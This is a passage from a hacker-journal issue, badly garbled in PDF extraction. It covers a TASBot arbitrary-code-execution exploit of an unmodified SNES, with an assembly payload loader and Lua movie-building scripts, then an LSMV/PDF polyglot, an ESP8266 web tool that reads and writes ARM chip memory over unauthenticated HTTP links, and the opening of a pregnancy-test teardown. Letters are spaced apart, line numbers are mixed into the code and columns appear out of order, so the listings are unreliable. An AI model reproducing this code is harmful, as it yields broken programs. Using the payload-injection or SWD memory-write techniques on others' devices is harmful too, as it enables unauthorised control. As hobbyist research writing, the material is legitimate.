; This i s jump , copy t h e a d d r e s s .
159 STA $12
LDA $0080
161 STA $10
BRA out
163 not_jump :
LDA $0080
; Starting address .
165 STA $0000
LDA $0082
; Bank .
167 STA $0006
LDA $0084
; Ending a d d r e s s .
169 STA $0002
171 ; S e l f −modify t h e move .
LDX #m o v e _ i n s t r u c t i o n
173 LDA $0006
AND #$FF
175 STA $01 ,X
177 ; Enter t r a n s f e r .
LDA #$0001
179 STA $0008
181 ; See you n e x t frame .
JMP n o _ r e s e t _ t r a n s f e r
183
doing_transfer :
185
; Copy t h e s t u f f t o i t s f i n a l p l a c e i n WRAM.
187 LDY $0000
LDX #$0080
189 LDA #$003F
PHB
191 m o v e _ i n s t r u c t i o n :
f i n a l place
MVN $40 , $00
; Bogus bank , w i l l be
19modified .
193 PLB
TYA
195 STA $0000
CMP $0002
197 BNE n o _ r e s e t _ t r a n s f e r
STZ $0008
; End t r a n s f e r .
199 n o _ r e s e t _ t r a n s f e r :
; Next frame .
201 JMP frame_loop
out :
203 JMP [ $10 ]
3.12
Stage 5: Transfers of data in
blocks with headers.
(3,840 bytes per second.)
This routine is rather complex, so let’s review
some of its trickier parts.
The serial protocol works by first setting the
latch bit (bit 0) in 0x4016, then clearing it, then
reading the appropriate number of times from
0x4016 (port #1) and 0x4017 (port #2). Bit 0 of
the read result is the first data line value, while bit
1 is the second data line value. After each read, the
line is automatically clocked so the next bit is read.
The two port latch lines are connected together; bit
0 of 0x4016 controls both.
The bot is slow, so we wait after setting/clearing
the latch bit. We properly reassemble the input in
the usual order of the controller registers, since we
have CPU time available to do that. Since we read
16-bit quantities, port 0x4017 is read as high 8 bits,
so the data lines there appear as bits 8 and 9.
To handle large payloads, the payload is divided
into blocks with headers. Each header tells where
the payload is to be written, or, if it is the last block,
where to begin execution.
The routine uses self-modifying code: The source
and destination banks in MVN are fixed in code, but
this code is dynamically rewritten to refer to correct
target bank.
3.13
Automating the Movie Creation
Since manually editing, recompiling and transform-
ing inputs gets old very fast when iterating payload
ROMs, tools to automate this are very useful. This
is the whole reason for having Stage 5 use block
headers. Furthermore, to not have one person do-
ing the work every time, it’s helpful to have a tool
that even script-kiddies can run. The tool to do this
is a Lua script that runs inside the emulator (The
LSNES emulator has built-in support for running
Lua scripts, with all sorts of functions for manipu-
lating the emulator.)
1 d o f i l e ( " sgb−a r b i t r a r y w r i t e . l u a " ) ;
3 make_movie = f u n c t i o n ( f i l e n a m e )
write_sgb_data ( " s t a g e 4 . dat " ) ;
5
write_8bytes_data ( " s t a g e 5 . dat " ) ;
w r i t e _ x f e r _ b l o c k ( f i l e n a m e , 0 x8000 , 0
x7E8000 , 0 x4000 , 8 ) ;
7
w r i t e _ x f e r _ b l o c k ( f i l e n a m e , 0 x10000 ,
0 x7F8000 , 0x7A00 , 8 ) ;
write_jump_block ( 0 x7E8051 , 8 ) ;
9
p r i n t ( "Done" ) ;
end
This code, the main Lua script, refers to four
external files. “stage4.dat” contains the memory
writes to load the Stage 4 payload from Section 3.11
while executing in the controller registers.
This file contains the Stage 4 payload, plus the
ill-fated attempt to shut up the DMG. (As noted
previously, it dies on its own later.) The first line
containing 0x001900 is the address to jump to after
all bytes are written.
2) “stage5.dat”, which is the machine code cor-
responding to the Stage 5 loader.
3) A filename taken as a parameter, which is the
payload ROM to use. As you can see, the Lua script
fixes the memory mappings, but this is okay, as those
are not difficult to modify.
The specified memory mappings copy a sixteen
kilobyte byte region starting from file offset 0x8000
into 0x7E8000, and the 0x7A00 byte region start-
ing from offset 0x10000 into 0x7F8000. (The first
32kB is assumed to contain initialization code for
stand-alone testing, but we don’t care about that.)
4) “sgb-arbitrarywrite.lua”, which is just a
function library.
−−sgb−a r b i t r a r y w r i t e . l u a
2 l o = f u n c t i o n ( a ) return b i t . band ( a , 0xFF ) ;
end
mid = f u n c t i o n ( a ) return b i t . band ( b i t .
l r s h i f t ( a , 8 ) , 0xFF ) ; end
4 h i = f u n c t i o n ( a ) return b i t . band ( b i t . l r s h i f t
( a , 1 6 ) , 0xFF ) ; end
6 s e t 8 = f u n c t i o n ( obj , p o r t , c o n t r o l l e r , index
, val )
f o r i =0 ,7 do o b j : s e t _ b u t t o n ( p o r t ,
c o n t r o l l e r , index + i , b i t . t e s t _ a l l ( b i t .
l s h i f t ( v a l , i ) , 1 2 8 ) ) ; end
8 end
2010
12
14
16
18
20
22
24
26
28
30
32
34
36
38
40
42
add_frame=f u n c t i o n ( a , b , c , d , e , f , g , h ,
sync )
l o c a l frame = movie . blank_frame ( ) ;
frame : s e t _ b u t t o n ( 0 , 0 , 0 , s y n c ) ;
s e t 8 ( frame , 1 , 0 , 0 , b ) ;
s e t 8 ( frame , 1 , 0 , 8 , a ) ;
s e t 8 ( frame , 1 , 1 , 0 , f ) ;
s e t 8 ( frame , 1 , 1 , 8 , e ) ;
s e t 8 ( frame , 2 , 0 , 0 , d ) ;
s e t 8 ( frame , 2 , 0 , 8 , c ) ;
s e t 8 ( frame , 2 , 1 , 0 , h ) ;
s e t 8 ( frame , 2 , 1 , 8 , g ) ;
movie . append_frame ( frame ) ;
end
44 write_8bytes_data = f u n c t i o n ( f i l e n a m e )
l o c a l f i l e , e r r = i o . open ( f i l e n a m e ) ;
46
i f not f i l e then e r r o r ( e r r ) ; end
while t r u e do
48
l o c a l data = f i l e : r e a d ( 8 ) ;
i f not data then break ; end
50
local a , b, c , d, e , f , g , h = string .
b y t e ( data , 1 , 8 ) ;
add_frame ( a , b , c , d , e , f , g , h , t r u e ) ;
52
end
f i l e : close () ;
54 end
56 w r i t e _ x f e r _ b l o c k = f u n c t i o n ( f i l e n a m e ,
f i l e o f f s e t , targetaddress , s i z e , speed )
l o c a l f i l e , e r r = i o . open ( f i l e n a m e ) ;
58
i f not f i l e then e r r o r ( e r r ) ; end
f i l e : seek ( " set " , f i l e o f f s e t ) ;
60
while s i z e % ( 8 ∗ s p e e d ) ~= 0 do s i z e =
s i z e + 1 ; end
l o c a l endaddr = b i t . band ( t a r g e t a d d r e s s +
s i z e , 0xFFFF) ;
62
−−Write t h e h e a d e r .
add_frame ( l o ( t a r g e t a d d r e s s ) , mid (
targetaddress ) , hi ( targetaddress ) , 0 , lo
( endaddr ) , mid ( endaddr ) , 0 , 0 , t r u e ) ;
64
f o r i =2 , s p e e d do add_frame ( 0 , 0 , 0 , 0 , 0 ,
0 , 0 , 0 , f a l s e ) ; end
write_sgb_data = f u n c t i o n ( f i l e n a m e )
l o c a l jump_address = n i l ;
l o c a l f i l e , e r r = i o . open ( f i l e n a m e ) ;
i f not f i l e then e r r o r ( e r r ) ; end
f o r i i n f i l e : l i n e s ( ) do
i f i == " " then
e l s e i f not jump_address then
jump_address = tonumber ( i ) ;
else
l o c a l a , b = s t r i n g . match ( i , "(%w+)%s
+(%w+)" ) ;
a = tonumber ( a ) ;
b = tonumber ( b ) ;
add_frame ( 0 xA9 , b , 0x8D , l o ( a ) , mid ( a ) 66
, 0xCB , 0 x80 , 0xF8 , t r u e ) ;
end
68
end
add_frame ( 0 x5C , l o ( jump_address ) , mid (
jump_address ) , h i ( jump_address ) , 0 , 0 , 0 70
x80 , 0xF8 , t r u e ) ;
f i l e : close () ;
end
72
−−Write a c t u a l data .
f o r i = 0 , s i z e /8−1 do
l o c a l data = f i l e : r e a d ( 8 ) ;
i f data == n i l then data = s t r i n g . char
( 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ) ; end
while #data < 8 do data = data . . s t r i n g
. char ( 0 ) ; end
local a , b, c , d, e , f , g , h = string .
b y t e ( data , 1 , 8 ) ;
add_frame ( a , b , c , d , e , f , g , h , i %
Figure 10 – Why should we wait for next frame? Go sub-frame! (in green)
213.14.2
s p e e d == 0 ) ;
end
74
f i l e : close () ;
end
76
write_jump_block = f u n c t i o n ( a d d r e s s , s p e e d )
78
add_frame ( l o ( a d d r e s s ) , mid ( a d d r e s s ) , h i (
address ) , 1 , 0 , 0 , 0 , 0 , true ) ;
f o r i =2 , s p e e d do add_frame ( 0 , 0 , 0 , 0 , 0 ,
0 , 0 , 0 , f a l s e ) ; end
80 end
Now that we have the screen itself set up and able
to run we need to stream data from Twitch chat
to the SNES. But we only have 64 bytes per frame
available to support emoji as well as the alphabet,
numbers, various symbols, and even special triggers
for controlling the payload execution. This complex-
ity quickly bogged down our throughput per frame,
so we created special encodings for performance! On
average the most common characters will be a-z in
lower case, which conveniently fit into a 5–bit en-
coding with several more character to spare.
This script assumes that the loaded movie causes
the SNES to jump into controller registers and then
enable NMI, using the methods described earlier. It
appends the rest of the stages and payload to the
movie. Also, since it edits the loaded input, it is
possible to just load state near the point of gaining
control of the SNES and then append the payload
for very fast testing. (Otherwise it would take about
two minutes for it to reach that point when execut-
ing from the start.)
3.14
Stage 6: Twitch Chat Interface
After successfully transferring our payload, execu-
tion of the exploit payload (created by p4plus2) can
officially begin. There are three primary states to
the final payload: (1) Reset, (2) the Chat Interface,
and (3) a TASVideos Webview.
3.14.1
The Reset
Because much of the hardware state is either un-
known or unreliable at the point of control transfer
we need to initialize much of the system to a known
state. On the SNES this usually implies setting a
myriad of registers from audio to display state, but
also just as important is clearing out WRAM such
that a clean slate is presented to the payload. Once
we have a cleared state it is possible to perform
screen setup.
In the initial case we set the tile data and tilemap
VRAM addresses and set the video made to 0x01,
which gives us two layers of 4–bit depth (Layers 1
and 2) and a single layer of 2–bit depth, Layer 3.
Layer 1 is used as a background which displays
the chat interface, while Layer 2 is used for emoji
and text. Layer 3 is unused. A special case for the
text and emoji however is Red’s own text which is
actually present on the sprite layer, allowing code to
easily update that text independently.
The Chat Interface
The SNES has both 16–bit and 8–bit modes, so
in 16–bit mode we can easily process three charac-
ters with a bit to spare! But what about the rest of
our character space? Well, we have a single bit re-
maining and can set it to allow the remaining char-
acters to be alternatively encoded. The alternate
encoding allowed for two 7 bit characters, with an
additional toggle bit on the second character.
BXXXXXXX XXXXXXXX
2 i f (E) goto s p e c i a l _ e n c o d i n g
i f ( ! E) goto normal_encoding
4
normal_encoding :
0AAAAABB BBBCCCCC
6
A = f u l l character 1
B = f u l l character 2
8
C = f u l l character 3
special_encoding :
10
1XXXXXXX SXXXXXXX
i f ( S ) goto special_command
12
i f ( ! S ) goto r e a d _ t w o _ c h a r a c t e r s
read_two_characters :
14
1AAAAAAA 0BBBBBBB
A = f u l l character 1
16
B = f u l l c h a r a c t e r 2 ( used f o r
Red ’ s t e x t )
special_command :
18
1AAAAAAA 1BBBBBBB
A = f u l l character 1
20
B = Command b y t e
22rebelofold: WUT
55: whaaat
Hi Mom!!
georgemichaels: we're the
chat
gallerduse: HI COUCH
kyiroo:
//
ch1ll1e:
zoranthebear: WOOOOOO
ederarm: Lmao
liontheturtle: OMFG
devinlock: Oh my
wallydrag: HI MOM
toastypls: MATRIX dear
external perspective the hardware was completely
unmodified. The bot itself was connected by a USB
serial interface to a MacBook Pro running Linux.
The source of the button presses being sent to the
bot was in the form of a continuous bitstream repre-
senting the state of all buttons for each frame. Once
the payload was fully written and the Twitch chat
interface was complete the bitstream transitioned
from being pre-created movie content to a bitstream
in the format the chat interface payload needed it
in, with 5-bit and 7-bit encodings for characters and
emoji. This was controlled by the python scripts 22
that relied on a script to identify when Red, the
player inside of the Pokémon Red game, said var-
ious things. The script also triggered things that
TASBot, the robot holding the replay device, would
say via the use of espeak, which allowed us to create
a conversation between TASBot and Red.
Finally, as part of the script we predefined pe-
riods where we would “deface” the TASVideos web-
site by changing it to different colors; this worked
by showing an image on the SNES as well as liter-
ally defacing the actual website. Finally, the script
was built with the ability to send commands to a
serial-controlled camera, but truth be told we ran
out of time to test it so we used a bit of stage magic
to pretend like Twitch chat was interacting with the
camera by typing directions to move it, and we had
a helpful volunteer running the camera for us.
twitch
molten-: WHAT
asdyyy: start9
dor: LOL
gadwin100: rekt
andykarate: fdg
tovargent:
soulroarn: WHAT?
lukeskywars: UP
k1dsmirk: heloooo!!!!
love-struck-: HULLO
HI MOM!
anthecaiun:
Chat
Figure 11 – Twitch chat!
The most important command was EE, cho-
sen very arbitrarily, which meant “transition state.”
The state transition would then toggle between the
TASVideos website and chat interface. Also worth
noting is that any character with a value of 00 was
considered a null character and was not displayed
for synchronization purposes.
3.15
The Website
The website itself is not very complicated, rather
just interesting to mention to take advantage of
mode 0x03 which allowed us to render a 256–color
image, rather than the standard 16–color images
from the prior section. The only caveat was that we
had to make a quick tool to remove duplicate tiles to
optimize the tile data to fit in VRAM. Background
colors were controlled by tweaking the palette data
rather than the image itself, as the SNES is very
poor at manipulating raw tile data due to its planar
pixel format.
3.16
3.17
Live Performance
These exploits were unveiled at AGDQ 2015. They
were streamed live to over 100,000 people on Jan-
uary 4th with a mangled Python script that didn’t
trigger the text for Red properly, then again on Jan-
uary 11th with the full payload. The run was very
well received and garnered press coverage from Ars
Technica 23 among others and resulted in substan-
tially more interest in TASBot and the art of arbi-
trary code execution on video games than had ex-
isted previously. Most importantly, the TAS por-
tions of the marathon where the exploit was fea-
tured helped raise over fifty thousand dollars di-
rectly to the Prevent Cancer Foundation. Overall,
the project was a resounding success, well worth the
substantial effort that our team put into it.
Outside of the SNES
The bot was connected to the console through the
controller ports and a single wire going to the reset
pin on the expansion board, meaning that from an
22 https://github.com/TheAxeMan301/PptIrcBot
23 Pokémon
Plays Twitch: How a Robot got IRC Running on an Unmodified SNES by Kyle Orland
234
This PDF is also a Gameboy exploit that displays
the “Pokémon Plays Twitch” article!
The idea for this polyglot is to embed the con-
tents of the previous article in this fine issue of
PoCkGTFO in such a way that it shows on when
played as an LSNES movie. So now you can use
your copy of the journal to exploit your hardware
and read “Pokémon Plays Twitch” on your TV. This
way, we hope to start a tradition of articles being
viewable on the hardware of the article!
The binary LSMV format is chunk-based. The
“lsmv” magic must be at offset 0; we can’t have
any appended data. So the PDF header and con-
tent must be added in a dummy chunk early in the
LSMV, and the ZIP and PDF footer must be added
at the end of the file, in another dummy chunk (see
included diagram).
A clean version of the LSMV file has been sub-
mitted to TASVideos. 24 You can play this polyglot
on a modified LSNES with the hybrid emulation
core using BSNES and Gambatte or, if you have
the required hardware, on the real stuff!
LSNES supports two kinds of movie files, which
might better be thought of as input recording files.
The older format is ZIP based and formally speci-
fied, while the new one is binary and custom. The
new binary format has no official specs, but start-
ing a PDF with a ZIP signature would now trigger
Adobe’s blacklist—clearly, someone at the company
must have disliked something about one of our pre-
vious releases. So the new, non-ZIP LSMV binary
format is the one that we’ll use.
LSMV
header
chunk header
dummy chunk
actual content
object header
ZIP
ZIP files
are parsed
bottom-up
actual content
chunk header
dummy object
actual content
dummy chunk
The buffers for read and write calls for movie
data are straight out of the movie data in memory.
One unintended benefit of the new format is that
it is much easier to write from SIGSEGV or similar
signal handlers. (The memory allocator cannot be
trusted.)
object footer
PDF footer
dummy comment
Be warned that none of these approaches is triv-
ial. We include detailed howtos with the zip con-
tents of this issue. 25
24 http://tasvideos.org/4947S.html
25 unzip
PDF
up to 1kb
tolerated
-j pocorgtfo10.pdf pokemon_plays_twitch/sgbhowto.pdf
24255
SWD Marionettes; or,
The Internet of Unsuspecting Things
by Micah Elizabeth Scott
Greetings, neighbors! Let us today gather to cel-
ebrate the Internet of Things. We live in a world
where nearly any appliance, pet, or snack food can
talk to the Cloud, which sure is a disarming name for
this random collection of computers we’ve managed
to network together. I bring you a humble PoC to-
day, with its origins in the even humbler networking
connections between tiny chips.
5.1
flash, single-step code, and anything else a debug-
ger does. I took my first dive into SWD in order to
develop an automated testing infrastructure for the
Fadecandy LED controller project. There was much
yak shaving, but the result was totally worthwhile.
More recently, Cortex-M0 microcontrollers have
been showing up with prices and I/O features com-
petitive with 8-bit microcontrollers. For example,
the Freescale MKE04Z8VFK4 is less than a dollar
even in single quantities, and there’s a feature-rich
development board available for $15. These micros
are cheaper than many single-purpose chips, and
they have all the peripherals you’d expect from an
AVR or PIC micro. The dev board is even compat-
ible with Arduino shields.
In light of this economy of scale, I’ll even con-
sider using a Cortex-M0 as a sort of I/O expander
chip. This is pretty cool if you want to write micro-
controller firmware, but what if you want something
without local processing? You could write a sort
of pass-through firmware, but that’s extra complex-
ity as well as extra timing uncertainty. The SWD
port would be a handy way to have a simple remote-
controlled set of ARM peripherals that you can drive
from another processor.
Okay! So let’s get to the point. SWD is neat,
we want to do things with it. But, as is typical
with ARM, the documentation and the protocols are
fiercely layered. It leads to the kind of complexity
that can make little sense from a software perspec-
tive, but might be more forgivable if you consider
the underlying hardware architecture as a group of
tiny little machines that all talk asynchronously.
The first few tiny machines are described in the
250-page ARM Debug Interface Architecture Spec-
ification ADIv5.0 to ADIv5.2 tome. 26 It becomes
apparent that the tiny machines must be so tiny be-
cause of all the architectural flexibility the designers
wanted to accommodate. To start with, there’s the
Debug Port (DP). The DP is the lower layer, clos-
est to the physical link. There are different DPs for
JTAG and Serial Wire Debug, but we only need to
be concerned with SWD.
We can mostly ignore JTAG, except for the pro-
cess of initially switching from JTAG to SWD on
Firmware? Where we’re going,
we don’t need firmware.
I’ve always had a fascination with debugging inter-
faces. I first learned to program on systems with
no viable debugger, but I would read magazines in
the nineties with articles advertising elaborate and
pricey emulator and in-circuit debugger systems.
Decades go by, and I learn about JTAG, but it’s
hard to get excited about such a weird, wasteful, and
under-standardized protocol. JTAG was designed
for an era when economy of silicon area was critical,
and it shows.
More years go by, and I learn about ARM’s Se-
rial Wire Debug (SWD) protocol. It’s a tantalizing
thing: two wires, clock and bidirectional data, give
you complete access to the chip. You can read or
write memory as if you were the CPU core, in fact
concurrently while the CPU core is running. This is
all you need to access the processor’s I/O ports, its
on-board serial ports, load programs into RAM or
26 http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ihi0031c/index.html
26SWCLKTCK
SWDIOTMS
0
At least 50 clocks
With SWDIOTMS
HIGH
1
1
1
1
0
0
1
1
1
1
0
JTAG-to-SWD sequence
0
1
1
1
At least 50 clocks
With SWDIOTMS
HIGH
Figure 12 – JTAG-to-SWD sequence timing
systems that support both options. SWD’s clock
matches the JTAG clock line, and SWD’s bidirec-
tional data maps to JTAG’s TMS signal. A magic
bit sequence in JTAG mode on these two pins will
trigger a switch to the SWD mode, as shown in Fig-
ure 12.
SWD will look a bit familiar if you’ve used SPI
or I2C at all. It’s more like SPI, in that it uses a
fast and non-weird clocking scheme. Each proces-
sor’s data sheet will tell you the maximum SWD
speed, but it’s usually upwards of 20 MHz. This
hints at why the protocol includes so many asyn-
chronous layers: the underlying hardware operates
on separate clock domains, and the debug port may
be operating much faster or slower than the CPU
clock.
Whereas SPI typically uses separate wires for
data in and out, SWD uses a single wire (it’s in
the name!) and relies on a “turnaround” period to
switch bus directions during one otherwise wasted
clock cycle that separates groups of written or re-
turned bits. These bit groups are arranged into tiny
packets with start bits and parity and such, using
turnaround bits to separate the initial, data, and
acknowledgment phases of the transfer. For exam-
ple, see Figures 13 and 14 to execute read and write
operations and for all the squiggly details on these
packets, the tome has you covered starting with Fig-
ure 4-1.
These low-level SWD packets give you a
memory-like interface for reading and writing reg-
isters; but we’re still a few layers removed from the
kind of registers that you’d see anywhere else in the
ARM architecture. The DP itself has some registers
accessed via these packets, or these reads and writes
can refer to registers in the next layer: the Access
Port (AP).
The AP could really be any sort of hardware that
needs a dedicated debug interface on the SoC. There
are usually vendor specific access ports, but usually
you’re talking to the standardized MEM-AP which
gives you a port for accessing the ARM’s AHB mem-
ory bus. This is what gives the debugger a view of
memory from the CPU’s point of view.
Each of these layers are of course asynchronous.
The higher levels, MEM-AP and above, tend to
have a handshaking scheme that looks much like
any other memory mapped I/O operation. Write
to a register, wait for a bit to clear, that sort of
thing. The lower level communications between DP
and AP needs to be more efficient, though, so reads
are pipelined. When you issue a read, that trans-
action will be returning data for the previous read
operation on that DP. You can give up the extra
throughput in order to simplify the interface if you
want, by explicitly reading the last result (without
starting a new read) via a Read Buffer register in
the DP.
This is where the Pandora’s Box opens up. With
the MEM-AP, this little serial port gives you full ac-
cess to the CPU’s memory. And as is the tradition
of the ARM architecture, pretty much everything is
memory-mapped. Even the CPU’s registers are in-
directly accessed via a memory mapped debug con-
troller while the CPU is halted. Now everything
in the thousands of pages of Cortex-M and vendor-
specific documentation is up for grabs.
27Clock
Wire driven by:
0
0
RDATA[0:31]
Host
1
1 A[2:3]
ACK[0:2]
RnW
Target
Figure 13 – Serial Wire Debug successful read operation
Clock
Host
0
0
WDATA[0:31]
Target
1
0 A[2:3]
ACK[0:2]
Wire driven by:
RnW
Host
Figure 14 – Serial Wire Debug successful write operation
5.2
Now I’m getting to the point.
GET interface for reading and writing memory.
Simple, joyful, and roughly equivalent security to
most Internet Things.
These little HTTP requests to read and write
memory happen quickly enough that we can build
a live hex editor that continuously scans any visible
memory for changes, and sends writes whenever any
value is edited. By utilizing all sorts of delightful
HTML5 modernity to do the UI entirely client-side,
we can avoid overloading the lightweight web server
on the ESP8266.
This all adds up to something that’s I hope could
I like making tools, and this seems like finally the
perfect layer to use as a foundation for something
a bit more powerful and more explorable. Combin-
ing the simple SWD client library I’d written earlier
with the excellent Arduino ESP8266 board support
package, attached you’ll find esp8266-arm-swd, 27
an Arduino sketch you can load on the $5 ESP8266
Wi-Fi microcontroller. There’s a README with
the specifics you’ll need to connect it to any ARM
processor and to your Wi-Fi. It provides an HTTP
27 unzip
pocorgtfo10.zip esp8266-arm-swd.zip
282
4
6
8
10
12
14
16
18
20
22
24
26
28
30
32
34
36
38
40
<ul>
< l i>
Turn t h e LED
<a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0 x40048008=0&0 x 4 0 0 f f 0 1 4 =0x00300800&0
x 4 0 0 f f 0 0 0 =0x00100800 "> r e d </a> ,
<a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0 x40048008=0&0 x 4 0 0 f f 0 1 4 =0x00300800&0
x 4 0 0 f f 0 0 0 =0x00200800 "> g r e e n </a> ,
<a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0 x40048008=0&0 x 4 0 0 f f 0 1 4 =0x00300800&0
x 4 0 0 f f 0 0 0 =0x00300000 "> b l u e </a> ,
<a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0 x40048008=0&0 x 4 0 0 f f 0 1 4 =0x00300800&0
x 4 0 0 f f 0 0 0 =0x00200000 "> cyan </a> ,
<a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0 x40048008=0&0 x 4 0 0 f f 0 1 4 =0x00300800&0
x 4 0 0 f f 0 0 0 =0x00100000 "> p i n k </a> ,
<a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0 x40048008=0&0 x 4 0 0 f f 0 1 4 =0x00300800&0
x 4 0 0 f f 0 0 0 =0x00000000 "> w h i t e i s h </a> , o r
<a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0 x40048008=0&0 x 4 0 0 f f 0 1 4 =0x00300800&0
x 4 0 0 f f 0 0 0 =0x00300800 "> o f f </a>
</ l i>
< l i>
Now <a i s="swd−async−a c t i o n " href=" / a p i / h a l t "> h a l t t h e CPU </a> and l e t ’ s have some
s c r a t c h RAM:
<p>
<swd−h e x e d i t addr=" 0 x20000000 " count=" 32 "></swd−h e x e d i t>
</p>
</ l i>
< l i>
<a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0 x20000000=0x22004b0a &.=0 x4a0a601a &.=0
x601a4b0a &.=0x4a0b4b0a&.=0x4b0b6013&.=0x2b003b01&.=0 x 2 3 8 0 d 1 f c &.=0 x6013035b &.=0x3b014b07
&.=0 x d 1 f c 2 b 0 0 &.=0 x 4 6 c 0 e 7 f 0 &.=0 x40048008 &.=0 x00300800 &.=0 x 4 0 0 f f 0 1 4 &.=0 x00200800 &.=0
x 4 0 0 f f 0 0 0 &.=0 x00123456 &.=0 x 7 f f f f f b c &.=0 x00000001 ">
Load a s m a l l program
</a>
i n t o t h e s c r a t c h RAM
</ l i>
< l i>
<a i s="swd−async−a c t i o n " href=" / a p i / r e g / w r i t e ?0 x3c=0x20000000 "> S e t t h e program
c o u n t e r </a>
(<span i s="swd−hexword " src=" / a p i / r e g " addr=" 0 x3c "></span>)
t o t h e top o f our program
</ l i>
< l i>
The PC <i>sample</ i> r e g i s t e r (<span i s="swd−hexword " addr=" 0 x e 0 0 0 1 0 1 c "></span>)
t e l l s you where t h e <i>r u n n i n g</ i> CPU i s
</ l i>
< l i>
<a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0xE000EDF0=0xA05F0001 "> Let t h e CPU
run ! </a>
( o r t r y a <a i s="swd−async−a c t i o n " href=" / a p i /mem/ w r i t e ?0xE000EDF0=0xA05F0005 ">
s i n g l e s t e p </a>)
</ l i>
< l i>
While t h e program i s running , you can modify i t s d e l a y v a l u e :
<span i s="swd−hexword " addr=" 0 x20000040 "></span>
</ l i>
</ ul>
Figure 15 – Single Wire Debug from HTML5
295.3
be used for a kind of literate reverse engineering and
debugging, in the way Knuth imagined literate pro-
gramming. When trying to understand a new plat-
form, the browser can become an ideal sandbox for
both investigating and documenting the unknown
hardware and software resources.
Put a chip in it!
While the practical applications of esp8266-arm-swd
may be limited to education and research, I think
it’s an interesting Minimum Viable Internet Thing.
With the ESP8266 costing only a few dollars, any-
thing with an ARM microcontroller could become
an Internet Thing with zero firmware modification,
assuming you can find the memory addresses or
hardware registers that control the parts you care
about. Is it practical? Not really. Secure? Defi-
nitely not! But perhaps take a moment to consider
whether it’s really any worse than the other so-
lutions at hand. Is ARM assembly and HTML5
your kind of fun? Please send pull requests. Happy
hacking
The included HTML5 web app, served by the Ar-
duino sketch, uses some Javascript to define custom
HTML elements that let you embed editable hex
dumps directly into documentation. Since a register
write is just an HTTP GET, hyperlinks can cause
hardware state changes or upload small programs.
There’s a small example of this approach on the
“Memory Mapped I/O” page, designed for the $15
Freescale FRDM-KE04Z board. This one is handy
as a prototyping platform, particularly since the I/O
is 5V tolerant and compatible with Arduino shields.
Figure 15 contains the HTML5 source for that demo.
This sample uses some custom HTML5 ele-
ments defined in /script.js: swd-async-action,
swd-hexedit, and swd-hexword. The swd-async-
-action isn’t so exciting, it’s really just a spe-
cial kind of hyperlink that shows a pass/fail re-
sult without navigating away from the page. The
swd-hexedit is also relatively mundane; it’s just
a shell that expands into many swd-hexword ele-
ments. That’s where the substance is. Any swd--
hexedit element that’s scrolled into view will be
refreshed in a continuous round-robin cycle, and the
content is editable by default. These become simple
but powerful tools.
30316
Reversing a Pregnancy Test; or,
Bitch better have my money!
by Amanda Wozniak
The adventure started like most adventures do—
in a dark bar near a technical institute over pints
of IPA. An serial entrepreneur plied me with com-
pliments, alcohol and assurances of a budget wor-
thy of my hourly rate to take an off-the shelf device
and build a sales-pitch demo in support of his natal
company’s fund-raising and growth plan. The goal
was to take approximately zero available fabrication
resources other than myself and spend a couple of
months to make a universally approachable, easy to
use demonstration prototype for a (now utterly de-
funct) startup’s flow strip technology with a hack-a-
thon patented Internet-of-Things interface. The tar-
get was an entry straight out of PC Magazine’s The
Secret World of Embedded Computers, the thing no
active neighbor should be without—a handy-dandy
off the shelf CVS digital pregnancy test.
6.1
What happened to space time. Is there one blue
line? Two? I feel faint. Fish? Fuck! I’m pregnant
with mutant fish babies.” 28
Now, it doesn’t matter which brand you buy for
this exercise—as far as I can tell, they’re all based
on the same two-chip solution built around a Holtek
HT48C06 microprocessor. And you can guess at the
function without cracking the case – just go buy one
(for extra bonus points, look as underaged as possi-
ble) and look at the test strips themselves.
Remember, this OTS technology is extra cool be-
cause back in the day, instead of peeing on a stick,
women suspected of pregnancy 29 had to have their
urine injected into a rabbit in order to assess preg-
nancy before the onset of “the quickening.” If you
think it’s hard telling the difference between ‘+’
and ‘–’, you definitely haven’t had to divine your
future livelihood from the appearance of leporid en-
trails. And for extra bonus by the Theory Of Cyber-
Extension, every time you use a digital pregnancy
test, a cute bunny Tamagotchi is saved from certain
death.
Fast, Cheap, and Easy
Head on down to your local pharmacy, and virtually
every store will carry a nifty brand of digital preg-
nancy tests. All of these tests are basically iden-
tical (inside and out), and the marketing strategy
is simple. Humans are bad at reading analog in-
puts, so when your time comes, let technology ease
your mind whether you, the user is stressed to the
breaking point trying to get pregnant or if you’re in
the boat of desperately hoping you’re sterile. “Oh
god, it’s been three seconds. Or minutes? Wait?
6.2
Basics of the Test
Each strip has an absorbent area (that you pee on)
and a clear window where the test results show up.
One stripe is a control stripe that ‘fires’ (changes
color) in any liquid from water to bourbon, and the
other one is a test stripe that only fires when suffi-
cient concentrations of the hormone hCG are present
28 The
mutant fish baby thing is kind of true according to developmental biology, but that’s not really our focus today.
fact: Eve was the first hacker and Cain was her first 0-day. Humankind is the ultimate Trojan. Since Cain was such
a dick in the Biblical sense, the hacking community has carried his mark of social stigma until this very day.
29 Fun
32in the fluid sample. (hCG stands for Human Chori-
onic Gonadotropin, named because scientists snicker
at words like “gonad.”) You can use the strips with-
out the digital tester, because all you’re being sold
is a device that will load in one of the basic strips,
and monitor the control and test stripes, and return
three results: ERROR, NOT or PREGNANT. It
turns out that $50 and getting at least one pregnant
woman to pee on a test strip can end up for an en-
tertaining couple of evenings at the old workbench.
Following these instructions, with enough time,
patience and abstinence, you’ll be able to make your
own legitimate-looking pregnancy test that works on
men and women alike! Or jazz it up to say “HI MOM”
in no time.
6.3
the housing for when I rebuilt the test with my own
internal electronics, to be virtually indistinguish-
able from the stock pregnancy test but with added
entrepreneurial functions. This strategic re-use of
injection molded parts and hard-to-design mecha-
nisms adds that special professional flair to demon-
stration prototypes.
Once you’ve got the holder off, you’ll uncover
an activation switch and the analog optical sen-
sor (made of two photodiodes and three LEDs), a
PLL (used only for its voltage-controlled oscillator)
IC, the aforementioned Holtek HT48C06, a 3V bat-
tery and a custom LCD. You can either look up
